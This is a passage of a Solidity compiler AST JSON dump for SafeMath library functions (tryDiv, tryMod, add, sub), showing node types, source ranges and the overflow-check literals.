												"src": "1424:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 211,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1424:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 214,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 250,
												"src": "1435:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 213,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1435:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1423:22:2"
									},
									"returnParameters": {
										"id": 220,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 217,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 250,
												"src": "1469:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 216,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1469:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 219,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 250,
												"src": "1475:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 218,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1475:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1468:15:2"
									},
									"scope": 493,
									"src": "1408:435:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 275,
										"nodeType": "Block",
										"src": "2068:76:2",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 263,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 261,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 254,
														"src": "2082:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 262,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2087:1:2",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2082:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 268,
												"nodeType": "IfStatement",
												"src": "2078:29:2",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 264,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2098:5:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 265,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2105:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 266,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "2097:10:2",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 260,
													"id": 267,
													"nodeType": "Return",
													"src": "2090:17:2"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 269,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2125:4:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 272,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 270,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 252,
																"src": "2131:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"id": 271,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 254,
																"src": "2135:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2131:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 273,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "2124:13:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 260,
												"id": 274,
												"nodeType": "Return",
												"src": "2117:20:2"
											}
										]
									},
									"documentation": "@dev Returns the division of two unsigned integers, with a division by zero flag.\n     * _Available since v3.4._",
									"id": 276,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryDiv",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 255,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 252,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 276,
												"src": "2008:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 251,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2008:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 254,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 276,
												"src": "2019:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 253,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2019:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2007:22:2"
									},
									"returnParameters": {
										"id": 260,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 257,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 276,
												"src": "2053:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 256,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2053:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 259,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 276,
												"src": "2059:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 258,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2059:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2052:15:2"
									},
									"scope": 493,
									"src": "1992:152:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 301,
										"nodeType": "Block",
										"src": "2379:76:2",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 289,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 287,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 280,
														"src": "2393:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 288,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2398:1:2",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2393:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 294,
												"nodeType": "IfStatement",
												"src": "2389:29:2",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 290,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2409:5:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 291,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2416:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 292,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "2408:10:2",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 286,
													"id": 293,
													"nodeType": "Return",
													"src": "2401:17:2"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 295,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2436:4:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 298,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 296,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 278,
																"src": "2442:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "%",
															"rightExpression": {
																"argumentTypes": null,
																"id": 297,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 280,
																"src": "2446:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2442:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 299,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "2435:13:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 286,
												"id": 300,
												"nodeType": "Return",
												"src": "2428:20:2"
											}
										]
									},
									"documentation": "@dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     * _Available since v3.4._",
									"id": 302,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 281,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 278,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 302,
												"src": "2319:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 277,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2319:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 280,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 302,
												"src": "2330:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 279,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2330:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2318:22:2"
									},
									"returnParameters": {
										"id": 286,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 283,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 302,
												"src": "2364:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 282,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2364:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 285,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 302,
												"src": "2370:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 284,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2370:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2363:15:2"
									},
									"scope": 493,
									"src": "2303:152:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 326,
										"nodeType": "Block",
										"src": "2757:108:2",
										"statements": [
											{
												"assignments": [
													312
												],
												"declarations": [
													{
														"constant": false,
														"id": 312,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 326,
														"src": "2767:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 311,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "2767:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 316,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 315,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 313,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 304,
														"src": "2779:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 314,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 306,
														"src": "2783:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2779:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2767:17:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 320,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 318,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 312,
																"src": "2802:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 319,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 304,
																"src": "2807:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2802:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206164646974696f6e206f766572666c6f77",
															"id": 321,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2810:29:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															},
															"value": "SafeMath: addition overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															}
														],
														"id": 317,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															511,
															512
														],
														"referencedDeclaration": 512,
														"src": "2794:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 322,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2794:46:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 323,
												"nodeType": "ExpressionStatement",
												"src": "2794:46:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 324,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 312,
													"src": "2857:1:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 310,
												"id": 325,
												"nodeType": "Return",
												"src": "2850:8:2"
											}
										]
									},
									"documentation": "@dev Returns the addition of two unsigned integers, reverting on\noverflow.\n     * Counterpart to Solidity's `+` operator.\n     * Requirements:\n     * - Addition cannot overflow.",
									"id": 327,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 307,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 304,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 327,
												"src": "2703:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 303,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2703:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 306,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 327,
												"src": "2714:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 305,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2714:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2702:22:2"
									},
									"returnParameters": {
										"id": 310,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 309,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 327,
												"src": "2748:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 308,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2748:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2747:9:2"
									},
									"scope": 493,
									"src": "2690:175:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 347,
										"nodeType": "Block",
										"src": "3203:88:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 339,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 337,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 331,
																"src": "3221:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 338,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 329,
																"src": "3226:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "3221:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a207375627472616374696f6e206f766572666c6f77",
															"id": 340,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3229:32:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															},
															"value": "SafeMath: subtraction overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															}
														],
														"id": 336,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															511,
															512
														],
														"referencedDeclaration": 512,
														"src": "3213:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 341,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3213:49:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 342,
												"nodeType": "ExpressionStatement",
												"src": "3213:49:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 345,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 343,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 329,
														"src": "3279:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 344,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 331,
														"src": "3283:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3279:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 335,
												"id": 346,
												"nodeType": "Return",
												"src": "3272:12:2"
											}
										]
									},
									"documentation": "@dev Returns the subtraction of two unsigned integers, reverting on\noverflow (when the result is negative).\n     * Counterpart to Solidity's `-` operator.\n     * Requirements:\n     * - Subtraction cannot overflow.",
									"id": 348,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 332,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 329,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 348,
												"src": "3149:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 328,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3149:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 331,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 348,
												"src": "3160:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 330,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3160:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3148:22:2"
									},
									"returnParameters": {
										"id": 335,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 334,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 348,
												"src": "3194:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 333,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3194:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3193:9:2"
									},
									"scope": 493,
									"src": "3136:155:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 380,
										"nodeType": "Block",
										"src": "3605:148:2",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 359,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
